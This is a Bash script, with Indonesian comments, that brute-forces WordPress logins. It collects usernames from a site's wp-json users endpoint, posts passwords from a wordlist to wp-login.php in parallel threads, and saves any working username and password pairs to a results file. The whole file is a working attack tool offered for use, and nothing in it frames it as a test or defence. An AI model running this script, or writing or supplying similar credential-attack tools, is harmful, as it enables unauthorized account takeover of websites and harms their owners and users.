#!/bin/bash

clear  # Membersihkan layar agar tampilan lebih fokus

curl_timeout=20
multithread_limit=20  # Menambah jumlah thread untuk mempercepat proses

if [[ -f wpusername.tmp ]]; then
    rm wpusername.tmp
fi
if [[ -f wpbf-results.txt ]]; then
    rm wpbf-results.txt
fi

RED='\e[31m'
GRN='\e[32m'
CYN='\e[33m'
CLR='\e[0m'
CYN='\e[0;36m'

function _GetUserWPJSON() {
    Target="${1}"
    UsernameLists=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s "${Target}/wp-json/wp/v2/users" | grep -Po '"slug":"\K.*?(?=")')
    
    if [[ -z ${UsernameLists} ]]; then
        echo -e "${CYN}INFO: Cannot detect Username!${CLR}"
    else
        > wpusername.tmp
        for Username in ${UsernameLists}; do
            echo "${Username}" >> wpusername.tmp
        done
    fi
}

function _TestLogin() {
    Target="${1}"
    Username="${2}"
    Password="${3}"
    LetsTry=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s -w "\nHTTP_STATUS_CODE_X %{http_code}\n" "${Target}/wp-login.php" --data "log=${Username}&pwd=${Password}&wp-submit=Log+In" --compressed)
    
    if [[ $(echo ${LetsTry} | grep "HTTP_STATUS_CODE_X" | awk '{print $2}') == "302" ]]; then
        echo -e "${GRN}[!] FOUND ${Target} \e[30;48;5;82m ${Username}:${Password} ${CLR}"
        echo "${Target} [${Username}:${Password}]" >> wpbf-results.txt
    fi
}

clear  # Membersihkan layar sebelum menjalankan program

echo -ne "[?] Input website target : \x1b[1;97m"
read Target

curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s "${Target}/wp-login.php" > wplogin.tmp
if [[ -z $(cat wplogin.tmp | grep "wp-submit") ]]; then
    echo -e "${RED}ERROR: Invalid WordPress wp-login!${CLR}"
    exit
fi

echo -ne "[?] Input password lists file: \x1b[1;97m"
read PasswordLists

if [[ ! -f ${PasswordLists} ]]; then
    echo -e "${RED}ERROR: Wordlist not found!${CLR}"
    exit
fi

_GetUserWPJSON ${Target}

if [[ -f wpusername.tmp ]]; then
    for User in $(cat wpusername.tmp); do
        (
            for Pass in $(cat ${PasswordLists}); do
                ((cthread=cthread%multithread_limit)); ((cthread++==0)) && wait
                _TestLogin ${Target} ${User} ${Pass} &
            done
            wait
        )
    done
else
    echo -ne "[?] Input username manually: \x1b[1;97m"
    read User
    
    if [[ -z ${User} ]]; then
        echo -e "${RED}ERROR: Username cannot be empty!${CLR}"
        exit
    fi
    (
        for Pass in $(cat ${PasswordLists}); do
            ((cthread=cthread%multithread_limit)); ((cthread++==0)) && wait
            _TestLogin ${Target} ${User} ${Pass} &
        done
        wait
    )
fi

if [[ -s wpbf-results.txt ]]; then
    echo "INFO: Found $(cat wpbf-results.txt | wc -l) username & password in wpbf-results.txt"
else
    echo "INFO: No valid credentials found."
fi
